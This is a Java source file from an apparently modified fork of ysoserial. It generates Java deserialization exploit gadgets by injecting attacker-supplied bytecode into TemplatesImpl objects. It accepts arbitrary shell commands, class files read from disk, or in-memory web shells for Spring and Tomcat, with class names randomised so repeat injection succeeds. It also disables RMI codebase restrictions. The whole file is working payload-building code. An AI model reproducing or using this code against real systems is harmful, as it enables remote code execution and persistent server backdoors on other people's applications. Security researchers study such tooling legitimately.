package ysoserial.payloads.util;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.LoaderClassPath;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang.RandomStringUtils;
import org.apache.wicket.util.file.Files;
import ysoserial.payloads.templates.SpringInterceptorMemShell;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.GZIPOutputStream;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings({"restriction", "rawtypes", "unchecked"})
public class Gadgets {

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }

    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }

    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }

    public static Map<String, Object> createMap(final String key, final Object val) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }

    public static Object createTemplatesImpl(String command) throws Exception {
        command = command.trim();
        Class tplClass;
        Class abstTranslet;
        Class transFactory;

        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            tplClass = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        } else {
            tplClass = TemplatesImpl.class;
            abstTranslet = AbstractTranslet.class;
            transFactory = TransformerFactoryImpl.class;
        }

        if (command.startsWith("CLASS:")) {
            // 这里不能让它初始化，不然从线程中获取WebappClassLoaderBase时会强制类型转换异常。
            Class<?> clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6), false, Thread.currentThread().getContextClassLoader());
            return createTemplatesImpl(clazz, null, null, tplClass, abstTranslet, transFactory);
        } else if (command.startsWith("FILE:")) {
            byte[] bs = Files.readBytes(new File(command.substring(5)));
            return createTemplatesImpl(null, null, bs, tplClass, abstTranslet, transFactory);
        } else {
            return createTemplatesImpl(null, command, null, tplClass, abstTranslet, transFactory);
        }
    }


    public static <T> T createTemplatesImpl(Class myClass, final String command, byte[] bytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        final T templates = tplClass.newInstance();
        byte[] classBytes = new byte[0];
        ClassPool pool = ClassPool.getDefault();
//        pool.insertClassPath(new ClassClassPath(abstTranslet));
        pool.insertClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
        CtClass superC = pool.get(abstTranslet.getName());
        CtClass ctClass;
        if (command != null) {
            ctClass = pool.get("ysoserial.payloads.templates.CommandTemplate");
            ctClass.setName(ctClass.getName() + System.nanoTime());
            String cmd = "cmd = \"" + command + "\";";
            ctClass.makeClassInitializer().insertBefore(cmd);
            ctClass.setSuperclass(superC);
            classBytes = ctClass.toBytecode();
        }
        if (myClass != null) {
            // CLASS:
            ctClass = pool.get(myClass.getName());
            ctClass.setSuperclass(superC);
            // SpringInterceptorMemShell单独对待
            if (myClass.getName().contains("SpringInterceptorMemShell")) {
                // 修改b64字节码
                CtClass springTemplateClass = pool.get("ysoserial.payloads.templates.SpringInterceptorTemplate");
                String clazzName = "ysoserial.payloads.templates.SpringInterceptorTemplate" + System.nanoTime();
                springTemplateClass.setName(clazzName);
                String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
                String b64content = "b64=\"" + encode + "\";";
                ctClass.makeClassInitializer().insertBefore(b64content);
                // 修改SpringInterceptorMemShell随机命名 防止二次打不进去
                String clazzNameContent = "clazzName=\"" + clazzName + "\";";
                ctClass.makeClassInitializer().insertBefore(clazzNameContent);
                ctClass.setName(SpringInterceptorMemShell.class.getName() + System.nanoTime());
                classBytes = ctClass.toBytecode();
            } else {
                // 其他的TomcatFilterMemShellFromThread这种可以直接加载 需要随机命名类名
                ctClass.setName(myClass.getName() + System.nanoTime());
                classBytes = ctClass.toBytecode();
            }
        }
        if (bytes != null) {
            // FILE:
            ctClass = pool.get("ysoserial.payloads.templates.ClassLoaderTemplate");
            ctClass.setName(ctClass.getName() + System.nanoTime());
            ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
            gzipOutputStream.write(bytes);
            gzipOutputStream.close();
            String content = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
            // System.out.println(content);
            ctClass.makeClassInitializer().insertBefore(content);
            ctClass.setSuperclass(superC);
            classBytes = ctClass.toBytecode();
        }


        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(Foo.class)});

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", RandomStringUtils.randomAlphabetic(8).toUpperCase());
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static HashMap makeMap(Object v1, Object v2) throws Exception {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }


        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }
}
